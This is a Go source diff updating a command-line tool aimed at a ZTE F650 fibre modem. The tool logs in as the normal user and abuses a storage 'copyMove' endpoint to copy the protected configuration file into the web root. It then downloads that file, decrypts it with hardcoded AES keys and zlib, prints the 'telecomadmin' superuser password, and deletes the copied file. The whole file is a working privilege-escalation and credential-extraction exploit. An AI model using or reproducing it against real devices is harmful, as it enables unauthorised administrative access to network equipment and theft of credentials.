@@ -4,134 +4,178 @@ import (
 	"bufio"
 	"bytes"
 	"compress/zlib"
+	"crypto/aes"
+	"crypto/cipher"
+	"crypto/sha256"
 	"encoding/binary"
 	"encoding/json"
+	"errors"
 	"flag"
+
 	"fmt"
 	"io"
-	"io/ioutil"
 	"net/http"
 	"net/url"
 	"os"
 	"strings"
 )
 
-const (
-	Host = "http://192.168.1.1"
-	UrlLogin = Host + "/cgi-bin/luci"
-	UrlGetToken = Host + "/cgi-bin/luci/"
+var (
+	Host          = "http://192.168.1.1"
+	UrlLogin      = Host + "/cgi-bin/luci"
+	UrlGetToken   = Host + "/cgi-bin/luci/"
 	UrlGetDevInfo = Host + "/cgi-bin/luci/admin/settings/gwinfo?get=all"
-	UrlExploit = Host + "/cgi-bin/luci/admin/storage/copyMove"
-	UrlDownCfg = Host + ":8080/db_user_cfg.xml"
+	UrlExploit    = Host + "/cgi-bin/luci/admin/storage/copyMove"
+	UrlDownCfg    = Host + ":8080/db_user_cfg.xml"
 	UrlDeleteFile = Host + "/cgi-bin/luci/admin/storage/deleteFiles"
 )
 
 var (
-	h bool
-	s bool
-	p string
+	help         bool
+	host         string
+	username     string
+	password     string
+	downloadOnly bool
+	cfgFile      string
 )
 
 type F650 struct {
-	username string
-	psd string
-	cookie *http.Cookie
-	token string
+	cookie  *http.Cookie
+	token   string
 	isLogin bool
 	version Version
 }
 
 type Version struct {
-	DevType string `json:"DevType"`
+	DevType    string `json:"DevType"`
 	ProductCls string `json:"ProductCls"`
-	SWVer string `json:"SWVer"`
-
+	SWVer      string `json:"SWVer"`
 }
 
 type Bytes []byte
 
 func init() {
-	flag.BoolVar(&h, "h", false, "帮助")
-	flag.BoolVar(&s, "s", false, "存在该参数时，解密后的配置文件将保存在当前目录")
-	flag.StringVar(&p, "p", "", "光猫的管理密码")
+	flag.BoolVar(&help, "help", false, "帮助")
+	flag.StringVar(&host, "h", "192.168.1.1", "光猫登录ip，默认为192.168.1.1(不需要http://)")
+	flag.StringVar(&username, "u", "useradmin", "光猫普通用户账号，默认为useradmin")
+	flag.StringVar(&password, "p", "", "光猫的管理密码")
+	flag.BoolVar(&downloadOnly, "d", false, "只下载db_user_cfg.xml到当前目录")
+	flag.StringVar(&cfgFile, "f", "", "从本地文件中读取并尝试解密,解密后的文件将会保存到新的文件中")
 }
 
 func main() {
-	f650 := F650 {username: "useradmin"}
-	if len(os.Args) == 1 {
+	flag.Parse()
+	if help {
+		flag.Usage()
+		os.Exit(0)
+	}
+
+	if len(cfgFile) > 0 {
+		data, err := os.ReadFile(cfgFile)
+		if err != nil {
+			panic(err)
+		}
+		decryptAndPrint(data)
+		decryptAndSaveToFile(data)
+
+		os.Exit(0)
+	}
+
+	if host != "" {
+		Host = fmt.Sprintf("http://%s", host)
+	}
+
+	if len(password) == 0 {
 		scanner := bufio.NewScanner(os.Stdin)
-		fmt.Print("用户名： useradmin\n密  码： ")
+		fmt.Printf("用户名： %s\n", username)
+		fmt.Printf("密  码： ")
 		if scanner.Scan() {
-			f650.psd = scanner.Text()
+			password = scanner.Text()
 		}
-	} else {
-		flag.Parse()
-		if h {
-			flag.Usage()
-			os.Exit(0)
-		}
-		f650.psd = p
 	}
-	f650.login()
-	if f650.isLogin {
-		f650.exploit()
-		f650.readPass()
-		f650.Clear()
+
+	f, err := login(username, password)
+	if err != nil {
+		panic(err)
 	}
+
+	f.PrintDevInfo()
+	f.Exploit()
+
+	cfgData := f.DownConfig()
+	if downloadOnly {
+		os.WriteFile("db_user_cfg.xml", cfgData, os.ModePerm)
+		f.Clear()
+		os.Exit(0)
+	}
+
+	decryptAndPrint(cfgData)
+	f.Clear()
 }
 
-func (f *F650) login() {
+func login(username, psd string) (*F650, error) {
+	f650 := &F650{}
+
 	client := http.Client{CheckRedirect: func(req *http.Request, via []*http.Request) error {
 		return http.ErrUseLastResponse
 	}}
 	values := url.Values{}
-	values.Add("username", f.username)
-	values.Add("psd", f.psd)
+	values.Add("username", username)
+	values.Add("psd", psd)
 	resp, err := client.PostForm(UrlLogin, values)
 	if err != nil {
-		fmt.Println(err)
-		return
+		return nil, err
 	}
 	if resp.StatusCode == http.StatusFound {
-		f.cookie = resp.Cookies()[0]
-		f.isLogin = true
+		f650.cookie = resp.Cookies()[0]
+		f650.isLogin = true
 	} else {
-		fmt.Println("\n登录失败: 密码错误")
-		return
+		return nil, errors.New("登录失败: 账号或密码错误！")
 	}
-	fmt.Println("\n登录成功")
 
 	// 获取token
-	req, _ := http.NewRequest(http.MethodGet, UrlGetToken, nil)
-	req.AddCookie(f.cookie)
-	resp, _ = client.Do(req)
-	tokenBody, err := ioutil.ReadAll(resp.Body)
+	req, err := http.NewRequest(http.MethodGet, UrlGetToken, nil)
+	if err != nil {
+		return nil, err
+	}
+	req.AddCookie(f650.cookie)
+	resp, err = client.Do(req)
+	if err != nil {
+		return nil, err
+	}
+	tokenBody, err := io.ReadAll(resp.Body)
+	resp.Body.Close()
 	if err == nil {
 		str := string(tokenBody)
-		index := strings.Index(str, "token")
+		index := strings.Index(string(tokenBody), "token")
 		if index >= 0 {
-			f.token = str[index + 8 : index + 8 + 32]
+			f650.token = str[index+8 : index+8+32]
+		} else {
+			return nil, errors.New("获取token失败！")
 		}
+	} else {
+		return nil, err
 	}
 
 	// 获取版本
 	req, _ = http.NewRequest(http.MethodGet, UrlGetDevInfo, nil)
-	req.AddCookie(f.cookie)
-	resp, _ = client.Do(req)
-	defer resp.Body.Close()
-	verBody,err := ioutil.ReadAll(resp.Body)
-	version := Version{}
+	req.AddCookie(f650.cookie)
+	resp, err = client.Do(req)
 	if err == nil {
-		json.Unmarshal(verBody, &version)
+		verBody, err := io.ReadAll(resp.Body)
+		resp.Body.Close()
+		version := Version{}
+		if err == nil {
+			json.Unmarshal(verBody, &version)
+			f650.version = version
+		}
 	}
-	f.version = version
-	fmt.Println("-----------------------------------------")
-	fmt.Printf("设备类型：%s\n设备型号：%s\n固件版本：%s\n",
-		f.version.DevType, f.version.ProductCls, f.version.SWVer)
-	fmt.Println("-----------------------------------------")
+
+	fmt.Println("\n登录成功")
+	return f650, nil
 }
 
-func (f *F650) exploit() {
+func (f *F650) Exploit() {
 	values := url.Values{}
 	values.Add("token", f.token)
 	values.Add("opstr", "copy|//userconfig/cfg|/home/httpd/public|db_user_cfg.xml")
@@ -151,34 +195,15 @@ func (f *F650) exploit() {
 	(&http.Client{}).Do(req)
 }
 
-func (f *F650) readPass() {
+func (f *F650) DownConfig() []byte {
 	req, _ := http.NewRequest(http.MethodGet, UrlDownCfg, nil)
 	resp, err := (&http.Client{}).Do(req)
 	if err != nil || resp.StatusCode != http.StatusOK {
-		fmt.Println("似乎不支持你的光猫")
-		return
+		panic(err)
 	}
 	defer resp.Body.Close()
-	body, _ := ioutil.ReadAll(resp.Body)
-	dataBytes := unPack(body)
-	index := bytes.Index(dataBytes, []byte("telecomadmin"))
-	if index < 0 {
-		fmt.Println("似乎不支持你的光猫")
-		return
-	}
-	index = bytes.Index(dataBytes[index:], []byte("val=\"")) + index + len("val=\"")
-	end := bytes.Index(dataBytes[index:], []byte("\"")) + index
-	fmt.Printf("账号： %s\n密码： %s\n", "telecomadmin", string(dataBytes[index:end]))
-
-	if s {
-		filename := "./db_user_cfg.xml"
-		file, err := os.OpenFile(filename, os.O_CREATE|os.O_TRUNC, os.ModePerm)
-		if err != nil {
-			fmt.Printf("文件： %s创建失败\n%s\n", filename, err)
-		}
-		defer file.Close()
-		file.Write(dataBytes)
-	}
+	body, _ := io.ReadAll(resp.Body)
+	return body
 }
 
 func (f *F650) Clear() {
@@ -197,39 +222,116 @@ func (f *F650) Clear() {
 	}
 }
 
-func unPack(data Bytes) Bytes {
-	var nextOff, blockSize  uint32 = 60, 0
-	var out bytes.Buffer
-	buf := make(Bytes, 4)
-	reader := bytes.NewReader(data)
-	for {
-		if nextOff <= 0 {
-			break
-		}
-		// nextOff + 4是为了跳过记录解压后的数据大小的字节
-		reader.Seek(int64(nextOff + 4), io.SeekStart)
-		// 压缩数据块大小
-		reader.Read(buf)
-		blockSize = buf.toUint32()
-		// 下一块位置
-		reader.Read(buf)
-		nextOff = buf.toUint32()
-		//读取压缩块的数据
-		blockBuf := make(Bytes, blockSize)
-		reader.Read(blockBuf)
-		// 解压缩
-		bytesReader := bytes.NewBuffer(blockBuf)
-		r, _ := zlib.NewReader(bytesReader)
-		io.Copy(&out, r)
+func (f *F650) PrintDevInfo() {
+	fmt.Println("-----------------------------------------")
+	fmt.Printf("设备类型：%s\n设备型号：%s\n固件版本：%s\n",
+		f.version.DevType, f.version.ProductCls, f.version.SWVer)
+	fmt.Println("-----------------------------------------")
+}
+
+func decryptAndPrint(data []byte) {
+	{
+		fmt.Println("CRC")
+		origin, _ := CRC(data)
+		user, spwd, _ := readPass(origin)
+		fmt.Printf("\t超管账号： %s\n", user)
+		fmt.Printf("\t超管密码： %s\n", spwd)
 	}
 
-	return out.Bytes()
+	{
+		fmt.Println("AESCBC")
+		origin, _ := AESCBC(data)
+		user, spwd, _ := readPass(origin)
+		fmt.Printf("\t超管账号： %s\n", user)
+		fmt.Printf("\t超管密码： %s\n", spwd)
+	}
+
 }
 
-func (n *Bytes) toUint32() (res uint32) {
-	byteBuf := bytes.NewBuffer(*n)
-	binary.Read(byteBuf, binary.BigEndian, &res)
-	return
+func decryptAndSaveToFile(data []byte) {
+	{
+		origin, err := CRC(data)
+		if err == nil {
+			os.WriteFile("db_user_cfg_crc.xml", origin, os.ModePerm)
+		}
+	}
+
+	{
+		origin, err := AESCBC(data)
+		if err == nil {
+			os.WriteFile("db_user_cfg_aescbc.xml", origin, os.ModePerm)
+		}
+	}
 }
 
+func readPass(data []byte) (username, pwd string, err error) {
+	index := bytes.Index(data, []byte("telecomadmin"))
+	if index < 0 {
+		return "", "", errors.New("似乎不支持你的光猫")
+	}
+	index = bytes.Index(data[index:], []byte("val=\"")) + index + len("val=\"")
+	end := bytes.Index(data[index:], []byte("\"")) + index
+	return "telecomadmin", string(data[index:end]), nil
+}
 
+func CRC(data []byte) (dData []byte, err error) {
+	defer func() {
+		if er := recover(); er != nil {
+			fmt.Println(er)
+			dData, err = nil, errors.New("CRC：无法解密")
+		}
+	}()
+	var nextOff, blockSize uint32 = 60, 0
+	var out bytes.Buffer
+	for nextOff != 0 {
+		blockSize = unpackI(data[nextOff+4 : nextOff+8])
+		blockData := data[nextOff+12 : nextOff+12+blockSize]
+		r, err := zlib.NewReader(bytes.NewBuffer(blockData))
+		if err != nil {
+			return nil, err
+		}
+		io.Copy(&out, r)
+		nextOff = unpackI(data[nextOff+8 : nextOff+12])
+	}
+
+	return out.Bytes(), nil
+}
+
+func AESCBC(data []byte) (dData []byte, err error) {
+	defer func() {
+		if er := recover(); er != nil {
+			fmt.Println(er)
+			dData, err = nil, errors.New("AESCBC：无法解密")
+		}
+	}()
+	sign := unpackI(data[4:8])
+	key := []byte("8cc72b05705d5c46f412af8cbed55aad")[:31]
+	iv := []byte("667b02a85c61c786def4521b060265e8")[:31]
+	if sign != 4 {
+		key, iv = []byte("PON_Dkey"), []byte("PON_DIV")
+	}
+	keyArr, ivArr := sha256.Sum256(key), sha256.Sum256(iv)
+	key, iv = keyArr[:], ivArr[:16]
+	block, _ := aes.NewCipher(key)
+	mode := cipher.NewCBCDecrypter(block, iv)
+
+	var nextOff, blockSize uint32 = 60, 0
+	var out bytes.Buffer
+	for nextOff != 0 {
+		blockSize = unpackI(data[nextOff+4 : nextOff+8])
+		blockData := make([]byte, blockSize)
+		copy(blockData, data[nextOff+12:nextOff+12+blockSize])
+		mode.CryptBlocks(blockData, blockData)
+		out.Write(blockData)
+		nextOff = unpackI(data[nextOff+8 : nextOff+12])
+	}
+
+	return CRC(out.Bytes())
+}
+
+func unpackI(data []byte) uint32 {
+	var res uint32
+	buffer := bytes.NewBuffer(data)
+	binary.Read(buffer, binary.BigEndian, &res)
+	return res
+}
